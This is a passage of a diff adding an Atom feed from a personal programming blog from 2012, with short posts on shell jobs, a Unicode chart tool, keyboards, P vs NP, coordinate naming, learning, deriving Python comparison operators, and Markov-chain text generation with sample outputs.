+<p>That&#8217;s it. <code>jobs -p</code> outputs the <code>pids</code> of all background jobs.</p>
+
+<h2>The end</h2>
+
+<p>Enough for now. I can&#8217;t think of anything else. This is a fun subject, though, I may get back to it with new tricks when I learn any.</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[shplot and the Olympics]]></title>
+    <link href="http://blog.slezica.me/blog/2012/07/04/shplot-and-the-olympics/"/>
+    <updated>2012-07-04T20:34:00-03:00</updated>
+    <id>http://blog.slezica.me/blog/2012/07/04/shplot-and-the-olympics</id>
+    <content type="html"><![CDATA[<p>Some time ago I wrote <a href="https://github.com/slezica/shplot">shplot</a>, a small tool to output bar charts as unicode text.</p>
+
+<p>The Olympics weren&#8217;t everywhere at the time, but as they are now, why not a chart of the medals won by each country so far?</p>
+
+<p><img src="https://raw.github.com/slezica/shplot/master/img/shplot.png" alt="screenshot" /></p>
+
+<p>Fun! I&#8217;m glad I wasted that time.</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Stop trying to get rid of the keyboard]]></title>
+    <link href="http://blog.slezica.me/blog/2012/06/29/stop-trying-to-get-rid-of-the-keyboard/"/>
+    <updated>2012-06-29T20:31:00-03:00</updated>
+    <id>http://blog.slezica.me/blog/2012/06/29/stop-trying-to-get-rid-of-the-keyboard</id>
+    <content type="html"><![CDATA[<p>We used to communicate in <em>gestures</em>.</p>
+
+<p>Gestures were good to refer to <em>concrete</em> stuff, but as communication became more abstract, gestures turned out to be a poor transport.</p>
+
+<p>So we created <em>language</em>.</p>
+
+<p>With language we could express ideas of incredible complexity, such as this very sentence you are reading. I dare you to say that in signs.</p>
+
+<p>Language was such a good idea, that things worth <em>saying</em> became things worth <em>writing</em>, and eventually <em>portable, personal</em> means for writing were invented. Then writing was easy, but it had to be faster: the typewriter partially addressed that need, and finally the <em>keyboard</em> came along.</p>
+
+<p>The <em>fastest</em> way of using the <em>best</em> tool for communication we ever created. The <em>keyboard</em>.</p>
+
+<p>Smartphones, tablets, they are all fantastic devices, but we still use notebooks. Why? Simple: they have a <em>keyboard</em>. They enable us to express complex ideas quickly, using <em>language</em>.</p>
+
+<p>I hope this gesture madness is just a passing trend.</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[P vs NP: I finally understood why I care]]></title>
+    <link href="http://blog.slezica.me/blog/2012/06/14/p-vs-np-i-finally-understood-why-i-care/"/>
+    <updated>2012-06-14T20:29:00-03:00</updated>
+    <id>http://blog.slezica.me/blog/2012/06/14/p-vs-np-i-finally-understood-why-i-care</id>
+    <content type="html"><![CDATA[<p>What changes if, after so many years, someone finally proves what everyone seems to suspect: <strong>P != NP</strong>? Why is it important? What does the question tell me? Some problems are harder than others? No shit. Really?</p>
+
+<p>Well, what makes a problem <strong>hard</strong>? Is it hard for you? Hard for me? Hard for the average human?</p>
+
+<p>Those are entirely different criteria, for almost any interpretation of <em>you</em>, <em>me</em> and <em>average human</em>. <strong>Or are they?</strong> Well, it depends. Here&#8217;s the key question:</p>
+
+<p><strong>Do problems have intrinsic difficulty, or is difficulty dependent on the approach?</strong></p>
+
+<p>In other words &#8211; is <strong>P != NP</strong>?</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[I'm never using Points again]]></title>
+    <link href="http://blog.slezica.me/blog/2012/06/10/im-never-using-points-again/"/>
+    <updated>2012-06-10T20:26:00-03:00</updated>
+    <id>http://blog.slezica.me/blog/2012/06/10/im-never-using-points-again</id>
+    <content type="html"><![CDATA[<p>Did you ever have to face the somewhat embarrassing task of merging x-y coordinates with row-col coordinates code? Did you hate humanity and yourself?</p>
+
+<p>I did. Twice.</p>
+
+<p>It was nobody&#8217;s fault, really. It&#8217;s actually <code>Point</code>&#8217;s fault. For the mathematically inclined, <code>Point(x, y)</code> means <em>x-horizontal-y-vertical-from-lower-left</em>, while in the world of matrices, that&#8217;s <em>x-vertical-y-horizontal-from-top-left</em>.</p>
+
+<p>I take a vow, here and now, and the Internet can bare witness: I will <strong><em>never, ever</em></strong> use the name <code>Point</code> again, and favor <code>rc</code> and <code>xy</code> instead. No confusion possible.</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[6 steps to learn anything]]></title>
+    <link href="http://blog.slezica.me/blog/2012/06/09/6-steps-to-learn-anything/"/>
+    <updated>2012-06-09T20:28:00-03:00</updated>
+    <id>http://blog.slezica.me/blog/2012/06/09/6-steps-to-learn-anything</id>
+    <content type="html"><![CDATA[<p>I meet more and more people that seem to think intellect works somewhat like this:</p>
+
+<ol>
+<li>Ignorance</li>
+<li><strong><em>Eureka</em></strong>!</li>
+<li>Comprehension</li>
+</ol>
+
+
+<p>Well, here&#8217;s the deal. It&#8217;s more like this:</p>
+
+<ol>
+<li>Ignore <strong>it</strong></li>
+<li>Think <strong>it</strong> may be</li>
+<li>Be convinced <strong>it</strong> is</li>
+<li>Question <strong>it</strong></li>
+<li>Realize <strong>it</strong> is not.</li>
+<li>Repeat</li>
+</ol>
+
+
+<p>Now, the meaning of this <em>relevation</em> is twofold:</p>
+
+<ol>
+<li><p>If you don&#8217;t understand something, it&#8217;s not because you <em>just simply can&#8217;t</em>, or because <em>it&#8217;s hard stuff</em>&#8211; it&#8217;s because <strong>you are being lazy</strong>. There is no trick to it, no magic. Rinse and repeat. Great thinkers are quick, trained repeaters.</p></li>
+<li><p>You can never understand <strong>it</strong> fully. Embrace that. It also means you can <strong>always</strong> understand <strong>it</strong> better.</p></li>
+</ol>
+
+
+<p>So I don&#8217;t want to hear any more of this <em>I can&#8217;t get it</em> or <em>this is out of my reach</em> nonsense. It is out of my reach too, I&#8217;m just working hard to get closer.</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Deducing comparison operators]]></title>
+    <link href="http://blog.slezica.me/blog/2012/05/20/deducing-comparison-operators/"/>
+    <updated>2012-05-20T17:18:00-03:00</updated>
+    <id>http://blog.slezica.me/blog/2012/05/20/deducing-comparison-operators</id>
+    <content type="html"><![CDATA[<p>A fun fact about comparison operators is that all of <code>&lt;</code>, <code>&lt;=</code>, <code>&gt;</code>, <code>&gt;=</code>, <code>==</code> and <code>!=</code> can be deduced given just one of the first four. If you never thought about it, take a moment: if I give you <code>&gt;</code>, can you implement all the others?</p>
+
+<p>In languages that allow for traits, multiple inheritance, metaprogramming or some other form of non-intrusive code reuse, you could even implement a type that automatically provided all of the operators given at least one is overridden in each subtype.</p>
+
+<p>I just cooked up a class that does that in <code>Python</code>, implementing the operators in a circularly-dependent manner; i.e. in such a way that overriding one will cascade on to the others.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">class</span> <span class="nc">Order</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
+</span><span class='line'>    <span class="n">__lt__</span> <span class="o">=</span> <span class="k">lambda</span> <span class="bp">self</span><span class="p">,</span> <span class="n">other</span><span class="p">:</span> <span class="n">other</span> <span class="o">&gt;</span> <span class="bp">self</span>
+</span><span class='line'>    <span class="n">__gt__</span> <span class="o">=</span> <span class="k">lambda</span> <span class="bp">self</span><span class="p">,</span> <span class="n">other</span><span class="p">:</span> <span class="ow">not</span> <span class="bp">self</span> <span class="o">&lt;=</span> <span class="n">other</span>
+</span><span class='line'>    <span class="n">__le__</span> <span class="o">=</span> <span class="k">lambda</span> <span class="bp">self</span><span class="p">,</span> <span class="n">other</span><span class="p">:</span> <span class="n">other</span> <span class="o">&gt;=</span> <span class="bp">self</span>
+</span><span class='line'>    <span class="n">__ge__</span> <span class="o">=</span> <span class="k">lambda</span> <span class="bp">self</span><span class="p">,</span> <span class="n">other</span><span class="p">:</span> <span class="ow">not</span> <span class="bp">self</span> <span class="o">&lt;</span> <span class="n">other</span>
+</span><span class='line'>    <span class="n">__ne__</span> <span class="o">=</span> <span class="k">lambda</span> <span class="bp">self</span><span class="p">,</span> <span class="n">other</span><span class="p">:</span> <span class="bp">self</span> <span class="o">&lt;</span> <span class="n">other</span> <span class="ow">or</span> <span class="n">other</span> <span class="o">&lt;</span> <span class="bp">self</span>
+</span><span class='line'>    <span class="n">__eq__</span> <span class="o">=</span> <span class="k">lambda</span> <span class="bp">self</span><span class="p">,</span> <span class="n">other</span><span class="p">:</span> <span class="ow">not</span> <span class="bp">self</span> <span class="o">!=</span> <span class="n">other</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Also, if you&#8217;re into cheap high-level magic, you may find the test code in <a href="https://gist.github.com/2748698">the gist</a> more interesting than the class itself.</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Stochastic generation]]></title>
+    <link href="http://blog.slezica.me/blog/2012/05/19/stochastic-generation/"/>
+    <updated>2012-05-19T20:12:00-03:00</updated>
+    <id>http://blog.slezica.me/blog/2012/05/19/stochastic-generation</id>
+    <content type="html"><![CDATA[<p>Today, I&#8217;ve been looking into using non-deterministic (let&#8217;s say randomized) methods to generate information based on samples.</p>
+
+<p>Broadly speaking, the idea is to analyze an input stream to detect patterns, and then produce an output stream of non-deterministic information that resembles the original. The information can be text, music, or basically anything <a href="http://en.wikipedia.org/wiki/Discrete_space"><em>discrete</em></a>, anything you can separate into a series of items &#8211; letters/words, musical notes, etc.</p>
+
+<p>Specifically, I&#8217;ve been toying with <a href="http://en.wikipedia.org/wiki/Markov_chain">Markov chains</a> configured from the input. If you&#8217;re not familiar with the concept, and choose not to read through a mile of Wikipedia text, allow me a quick introduction.</p>
+
+<h2>Markov Chains</h2>
+
+<p><a href="http://en.wikipedia.org/wiki/Markov_chain"><img style="float: right;" title="2-state Markov chain" src="http://upload.wikimedia.org/wikipedia/commons/thumb/2/2b/Markovkate_01.svg/220px-Markovkate_01.svg.png" alt="image" /></a></p>
+
+<p>A Russian mathematician named Andrey Markov described a way to model processes by breaking them up into <em>states</em>, and then for each <em>state</em> offering the probability of passing to another <em>state</em>. <em>Markov chains</em> are part of his theory.</p>
+
+<p>Take a look at the image to the right. It&#8217;s showing a 2-state process, as described by a Markov chain. What it means is:</p>
+
+<ul>
+<li><p>There&#8217;s two states: <strong>A</strong>, and <strong>E</strong></p></li>
+<li><p>When the process is in state <strong>A</strong>, it has a 60% probability of remaining in that state, and a 40% probability of changing to <strong>E</strong></p></li>
+<li><p>When the process is in state <strong>E</strong>, it has a 30% probability of remaining in that state, and a 70% probability of changing to <strong>A</strong></p></li>
+</ul>
+
+
+<p>Markov chains have no long-term memory: the probability of going from <strong>A</strong> to <strong>E</strong> is always the same, it doesn&#8217;t matter if we&#8217;ve been in <strong>A</strong> for a while, or if we just jumped back from <strong>E</strong>. In other words, <em>the next state depends solely on the current one</em>.</p>
+
+<p>Well, that&#8217;s not always true: a Markov chain is said to be of <em>order 1</em> in that case. In a <em>Markov chain of order 2</em>, the probability of reaching a state next depends on the <em>two previous states</em>. In general, <em>order <strong>n</strong></em> means the short-term memory of the Markov chain includes the last <strong>n</strong> states visted.</p>
+
+<p>Good? Good. So what does this have to do with generating text or music?</p>
+
+<h2>Analyzing a stream</h2>
+
+<p>A Markov chain can created from any stream of information. Items that come out of the stream are considered <strong>states</strong>, and whenever an item <strong>X</strong> follows an item <strong>Y</strong>, we reflect that in the chain by appropriately increasing the probability of going from state <strong>X</strong> to state <strong>Y</strong>.</p>
+
+<p>For example, say you analyzed the following text and built a Markov chain based on letters you find:</p>
+
+<h3>Lorem ipsum dolor sit amet, consectetur adipiscing elit</h3>
+
+<p>You could then ask what letters can follow an &#8216;i&#8217;, and what&#8217;s the probability of each doing so &#8211; you&#8217;d get <em>33% &#8216;p&#8217;, 18% &#8216;s&#8217;, 33% &#8216;t&#8217;, and 16% &#8216;n&#8217;</em>.</p>
+
+<h2>Generating a similar stream</h2>
+
+<p>Once the <strong>Nth-order</strong> chain is built, and probabilities are known as above, it can used to answer the following question:</p>
+
+<h3>Given a group of <strong>n</strong> known items, what can the next item be?</h3>
+
+<p>The answer will be in the form of <em>&#8220;30% chance that it&#8217;s this, 25% chance that it&#8217;s that, etc&#8221;</em>. So, starting with any known <strong>n</strong> items, the information in the Markov chain can be used to generate any amount of following items randomly, but taking into account how those were related in the original stream.</p>
+
+<p>The higher the quality and quantity of the information you feed into the stream, the better its predictions will be and the more sense the generated stream will make &#8211; up to a point, of course. Markov chains of higher order tend to generate better results, too, since they make predictions based on more contextual information.</p>
+
+<h2>Example: analyzing an ESPN sports article</h2>
+
+<p>I fed an ESPN sports article into my handy Markovifier-X2000 (<em><a href="https://gist.github.com/2732680">don&#8217;t you have one?</a></em>), and had its letters analyzed to then spit out a short text. Leaving aside the quality of information taken from ESPN articles (thought they certainly are numerous), let me show the results for varying orders of the underlying Markov chain so you can appreciate the effect.</p>
+
+<p><strong>Order 1 chain (only last letter considered when picking next letter):</strong></p>
+
+<blockquote><p>Hens&#8217;s. wis af pe terect&#8217;sd o He. p mpaseen s hesil ongutecon go in jan f tofreverat atee tin l gonspherd athensrenot a d d Ster</p></blockquote>
+
+<p><strong>Order 2 chain (last two letters considered):</strong></p>
+
+<blockquote><p>uot fou witech th wanch the Pactiff himes fres play-Z aftess way. Heame, ing a sectful durit. Game, beek. Games&#8217; guareplayery on t</p></blockquote>
+
+<p><strong>Order 3 chain:</strong></p>
+
+<blockquote><p>Wization,&#8221; Stevenson? You was ver their of the Heat LeBron the Pacers&#8217; com one-hit again.&#8221; The shown respectful. &#8220;I&#8217;m not use. &#8221;</p></blockquote>
+
+<p><strong>Order 4 chain:</strong></p>
+
+<blockquote><p>He played one time, and the Miami Heat. He player, is not seen it. But it again.&#8221; The repeatedly over do it did that. It was flat</p></blockquote>
+
+<p>Getting better, huh?</p>
+
+<p><strong>Order 10 chain:</strong></p>
+
+<blockquote><p>Stevenson in 2007 during a playoff tiff he had with then Washington Wizards&#8217; guard DeShawn Stevenson to one-hit wonder Soulja Boy.</p></blockquote>
+
+<p>Look at that. You could throw that below a picture in ESPN.com and nobody would notice.</p>
+
+<h2>Next steps</h2>
+
+<p>If it doesn&#8217;t bore me first, I want to try this method for two more things:</p>
+
+<ul>
+<li>Generating midi music from samples</li>
+<li>Generating a (remotely) coherent text, using <a href="http://googleresearch.blogspot.com.ar/2012/05/from-words-to-concepts-and-back.html">Google&#8217;s concept database</a>.</li>
+</ul>
+
+
+<p>The second item sounds exciting, though I have a feeling the results will be dissapointing. I&#8217;ll let you know.</p>
+]]></content>
+  </entry>
+  
+</feed>
